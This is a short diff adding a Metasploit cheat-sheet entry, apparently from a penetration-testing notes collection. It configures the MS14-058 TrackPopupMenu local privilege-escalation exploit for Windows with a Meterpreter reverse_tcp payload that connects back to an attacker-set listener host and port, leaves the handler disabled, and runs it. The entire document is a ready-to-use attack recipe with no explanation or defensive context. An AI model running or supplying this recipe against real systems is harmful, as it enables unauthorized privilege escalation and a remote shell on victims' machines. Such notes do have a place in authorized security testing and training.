@@ -1,0 +1,12 @@
+privesc_ms14_058
+----------
+use exploit/windows/local/ms14_058_track_popup_menu
+set payload windows/x64/meterpreter/reverse_tcp
+#set payload windows/meterpreter/reverse_tcp
+set lhost <>
+set lport <>
+set target <>
+set session <>
+set DisablePayloadHandler True
+run
+++++++++++  
